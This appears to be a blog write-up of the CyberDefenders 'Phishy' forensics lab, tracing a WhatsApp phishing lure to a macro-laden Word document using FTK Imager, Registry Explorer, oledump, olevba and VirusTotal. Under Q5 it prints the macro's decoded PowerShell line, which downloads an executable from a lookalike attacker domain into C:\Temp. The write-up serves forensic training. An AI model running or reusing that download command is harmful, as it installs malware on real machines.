---
layout: single
ititle: Cyberdefenders - Phishy
excerpt: Analysis of an .ad1 file related to a phishing attack.
date: 2025-06-20
classes: wide
header:
  teaser: ../assets/images/sherlock-bumbleebe/
  teaser_home_page: true
  icon: ../assets/images/logo-icon.svg
categories:
   - cyberdefenders
   - dfir
tags:
   - autopsy
   - ftk imager
   - PasswordFox
---

We have been provided with a `.ad1` file, which we can be analyzed using FTK Imager. We have two options to review it. The first one is to upload the file as an Evidence Item and check the content through FTK interface; the second option is to mount the image on our system via FTK, that will let us to explore the content of the ad1 through our system. I will use the second option. 

![](../assets/images/cyber-phy/1.png)

After that, we can quickly go through the questions. 

------

<h3 style="color: #0d6efd;"> Q1 What is the hostname of the victim machine? </h3>

In order to answer this question we need to examine the SYSTEM hive, Located at: `C:\Windows\System32\config\SYSTEM`

Then, we need to upload this file into Registry Explorer, an Eric Zimmerman tool. 
Once we upload the file, we can find the computer name under: `ControlSet001\Control\ComputerName\ComputerName`

![](../assets/images/cyber-phy/2.png)

----

<h3 style="color: #0d6efd;"> Q2 What is the messaging app installed on the victim machine? </h3>

To answer this question, we need to navigate to the AppData directory. Within both the Local andRoaming directories, we will find the messaging app. 

----

<h3 style="color: #0d6efd;"> Q3 The attacker tricked the victim into downloading a malicious document. Provide the full download URL. </h3>

Well, to answer this question, I tried to use WhatsApp Viewer, but i got an error. So i use the following online tool, [sqliteviewer.app](https://sqliteviewer.app/#/msgstore.db/table/messages/). Just upload the msgstore.db file to the website, located at: `C:\Users\Semah\AppData\Roaming\WhatsApp\Databases`

![](../assets/images/cyber-phy/3.png)

------

<h3 style="color: #0d6efd;"> Q4 Multiple streams contain macros in the document. Provide the number of the highest stream. </h3>

To answer this question, we can use `oledumpm.py`, a python tool that allow us to analyze OLE files(old Word, Excel or PowerPoint documents). By applying the following command:

```bash
┌──(kali㉿kali)-[~/blue-labs/phishy]
└─$ oledump.py IPhone-Winners.doc
  1:       114 '\x01CompObj'
  2:      4096 '\x05DocumentSummaryInformation'
  3:      4096 '\x05SummaryInformation'
  4:      8473 '1Table'
  5:       501 'Macros/PROJECT'
  6:        68 'Macros/PROJECTwm'
  7:      3109 'Macros/VBA/_VBA_PROJECT'
  8:       800 'Macros/VBA/dir'
  9: M    1170 'Macros/VBA/eviliphone'
 10: M    5581 'Macros/VBA/iphoneevil'
 11:      4096 'WordDocument'
```

-------

<h3 style="color: #0d6efd;"> Q5 The macro executed a program. Provide the program name? </h3>

In order to answer this question, we can use `olevba` tool, we can install it with the following command: `pip install -U oletools`

Then, by executing the next command: 

`PS E:\Users\Semah\Downloads> olevba --deobf IPhone-Winners.doc`

We can see the following output: 

![](../assets/images/cyber-phy/4.png)

It is a base64 string, using `$ echo "<base64 string> | base64 -d`, finally we can a part of `powershell` script:

```bash 
invoke-webrequest -Uri 'http://appIe.com/Iphone.exe' -OutFile 'C:\Temp\IPhone.exe' -UseDefaultCredentials
```

-------

<h3 style="color: #0d6efd;"> Q6 The macro downloaded a malicious file. Provide the full download URL. </h3>

In the previous question, we can see the domain where malware downloads a windows executable, which is stored in a temporary directory.  

----

<h3 style="color: #0d6efd;"> Q7 Where was the malicious file downloaded to? (Provide the full path) </h3>


'C:\Temp\IPhone.exe'

-----

<h3 style="color: #0d6efd;"> Q8 What is the name of the framework used to create the malware? </h3> 

To answer this question, we need to get the hash of the malware using `Get-FileHas .\IPhone.exe`, which is : `72c677ba5bf40394361b3566b6bb2b1c0c5e726b10c9af2debf7384385ebdbd1`

Once we have the hash, we need to upload it to VirusTotal, we can see a reference to `mmeterpreter`, which is a powerfull and flexible payload in Metasploit that provides a shell for post-exploitation activities. 

![](../assets/images/cyber-phy/5.png)

-----

<h3 style="color: #0d6efd;"> Q9 What is the attacker's IP address? </h3>

In the previous virustotal analysis, in the `Behavior` section, we will find a `Memory Pattern IPs`, which is a ip found in the memory of an executed sample, in other words, a ip found on the malware strings. 

![](../assets/images/cyber-phy/6.png)

![](../assets/images/cyber-phy/7.png)

-----

<h3 style="color: #0d6efd;"> Q10 The fake giveaway used a login page to collect user information. Provide the full URL of the login page? </h3>


We can open the .ad1 file in Autopsy, navigate to this route: `C:\Users\<username>\AppData\Roaming\Mozilla\Firefox\Profiles\<profile folder>\places.sqlite` into the `moz_places` table. 

-----

<h3 style="color: #0d6efd;"> </h3>

![](../assets/images/cyber-phy/8.png)
